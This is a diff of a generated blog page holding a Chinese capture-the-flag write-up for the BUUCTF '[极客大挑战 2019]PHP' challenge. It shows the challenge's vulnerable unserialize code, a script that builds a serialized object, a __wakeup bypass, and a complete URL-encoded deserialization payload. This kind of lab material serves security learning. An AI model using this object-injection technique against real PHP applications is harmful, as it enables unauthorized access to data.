@@ -29,15 +29,7 @@
     
     
       
-      
-        
-          
-          
-          
-        
-        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
-      
-      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
     
   
 
@@ -61,6 +53,7 @@
 <!-- 自定义样式保持在最底部 -->
 
   
+<link rel="stylesheet" href="/css/mac.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
@@ -69,7 +62,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"always","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -172,7 +165,7 @@
 </nav>
 
     <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/0087.jpg') no-repeat center center;
+         style="background: url('https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152231002.jpg') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
@@ -199,7 +192,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      770 字
+      825 字
     </span>
   
 
@@ -209,7 +202,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      21
+      11
        分钟
     </span>
   
@@ -245,80 +238,86 @@
             <!-- SEO header -->
             <h1 style="display: none">BUU每日一题011</h1>
             
+              <p class="note note-info">
+                
+                  本文最后更新于：1 年前
+                
+              </p>
+            
             <div class="markdown-body">
               <h2 id="十一、"><a href="#十一、" class="headerlink" title="十一、"></a>十一、</h2><h3 id="题目：-极客大挑战-2019-PHP"><a href="#题目：-极客大挑战-2019-PHP" class="headerlink" title="题目：[极客大挑战 2019]PHP"></a>题目：[极客大挑战 2019]PHP</h3><p><img src="https://ftp.bmp.ovh/imgs/2021/01/c09882d30a32c90f.png" srcset="/img/loading.gif">         </p>
 <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>网页提示说备份网站，用御剑扫，没扫出来<br>换为<code>dirsearch</code>扫出来一个<code>www.zip</code><img src="https://ftp.bmp.ovh/imgs/2021/01/96633462d343eda9.png" srcset="/img/loading.gif"><br>加到url后面<code>http://63f0b170-4c01-4aa2-9608-5d33d689c712.node3.buuoj.cn/www.zip</code>得到一个压缩包，内有五个文件<br>主要内容：<br><code>index.php</code> :    </p>
-<pre><code><pre class="language-php" data-language="php"><code class="language-php">		<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>             
-	    <span class="token keyword">include</span> <span class="token single-quoted-string string">'class.php'</span><span class="token punctuation">;</span>          
-	    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          
-	    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           
-	    <span class="token delimiter important">?></span></span>        
+<div class="hljs"><pre><code><pre><code class="hljs php">		<span class="hljs-meta">&lt;?php</span>             
+	    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;          
+	    $select = $_GET[<span class="hljs-string">&#x27;select&#x27;</span>];          
+	    $res=unserialize(@$select);           
+	    <span class="hljs-meta">?&gt;</span>        
 	```      
 
 GET select参数，反序列化          
-``class.php``:  
+``<span class="hljs-keyword">class</span>.php``:  
    
 	```php
-			<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-			<span class="token keyword">include</span> <span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">;</span>
+			<span class="hljs-meta">&lt;?php</span>
+			<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;
 			
 			
-			<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			error_reporting(<span class="hljs-number">0</span>);
 			
 			
-			<span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">&#123;</span>
-			    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'nonono'</span><span class="token punctuation">;</span>
-			    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'yesyes'</span><span class="token punctuation">;</span>
+			<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;
+			    <span class="hljs-keyword">private</span> $username = <span class="hljs-string">&#x27;nonono&#x27;</span>;
+			    <span class="hljs-keyword">private</span> $password = <span class="hljs-string">&#x27;yesyes&#x27;</span>;
 			
-			    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-			        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
-			        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
-			    <span class="token punctuation">&#125;</span>
+			    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$username,$password</span>)</span>&#123;
+			        <span class="hljs-keyword">$this</span>-&gt;username = $username;
+			        <span class="hljs-keyword">$this</span>-&gt;password = $password;
+			    &#125;
 			
-			    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-			        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'guest'</span><span class="token punctuation">;</span>
-			    <span class="token punctuation">&#125;</span>
+			    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;
+			        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;
+			    &#125;
 			
-			    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-			        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-			            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>
-			            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"You name is: "</span><span class="token punctuation">;</span>
-			            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br>"</span><span class="token punctuation">;</span>
-			            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"You password is: "</span><span class="token punctuation">;</span>
-			            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br>"</span><span class="token punctuation">;</span>
-			            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-			        <span class="token punctuation">&#125;</span>
-			        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-			            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-			            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-			        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-			            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>
-			            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;
+			        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;
+			            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;
+			            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;
+			            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;
+			            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;
+			            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;
+			            <span class="hljs-keyword">die</span>();
+			        &#125;
+			        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;
+			            <span class="hljs-keyword">global</span> $flag;
+			            <span class="hljs-keyword">echo</span> $flag;
+			        &#125;<span class="hljs-keyword">else</span>&#123;
+			            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;
+			            <span class="hljs-keyword">die</span>();
 			
 			            
-			        <span class="token punctuation">&#125;</span>
-			    <span class="token punctuation">&#125;</span>
-			<span class="token punctuation">&#125;</span>
-			<span class="token delimiter important">?></span></span>        </code></pre></code></pre>
+			        &#125;
+			    &#125;
+			&#125;
+			<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
 <p>username为admin；password为100时，输出flag<br>因为传入的select会经过反序列化，所以构造的参数应该经过序列化<br>一位大佬的源码：     </p>
-<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name">Name</span>
-<span class="token punctuation">&#123;</span>
-    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"yesyesyes"</span><span class="token punctuation">;</span>
-    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"nonono"</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$username</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$password</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span>@admin<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token comment">//var_dump($a);</span>
-<span class="token comment">//echo "&lt;br>";</span>
-<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token comment">//输出序列化</span>
-<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出url编码后的序列化</span>
-<span class="token delimiter important">?></span></span>            </code></pre></code></pre>
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>
+<span class="hljs-class"></span>&#123;
+    <span class="hljs-keyword">private</span> $username = <span class="hljs-string">&quot;yesyesyes&quot;</span>;
+    <span class="hljs-keyword">private</span> $password = <span class="hljs-string">&quot;nonono&quot;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$username,$password</span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;username=$username;
+        <span class="hljs-keyword">$this</span>-&gt;password=$password;
+    &#125;
+&#125;
+$a = <span class="hljs-keyword">new</span> Name(@admin,<span class="hljs-number">100</span>);
+<span class="hljs-comment">//var_dump($a);</span>
+<span class="hljs-comment">//echo &quot;&lt;br&gt;&quot;;</span>
+$b = serialize($a);
+<span class="hljs-keyword">echo</span> $b.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-comment">//输出序列化</span>
+<span class="hljs-keyword">echo</span> urlencode($b);<span class="hljs-comment">//输出url编码后的序列化</span>
+<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
 <p>还需要绕过<code>_wakeup()</code>,将属性数改为3或者大于3的数字即可         </p>
 <h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>?select=O%3A4%3A&quot;Name&quot;%3A4%3A&#123;s%3A14%3A&quot;%00Name%00username&quot;%3Bs%3A5%3A&quot;admin&quot;%3Bs%3A14%3A&quot;%00Name%00password&quot;%3Bi%3A100%3B&#125;</code><img src="https://ftp.bmp.ovh/imgs/2021/01/9362857e700a46b0.png" srcset="/img/loading.gif">      </p>
 <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>php序列化与反序列化</strong>          </p>
@@ -444,7 +443,7 @@ GET select参数，反序列化
   <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
 
   <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.configure({"showSpinner":true,"trickleSpeed":200})
     NProgress.start()
     document.addEventListener('DOMContentLoaded', function() {
       window.NProgress && window.NProgress.inc();
@@ -470,8 +469,6 @@ GET select参数，反序列化
 
 
 
-  
-    
   
 
 
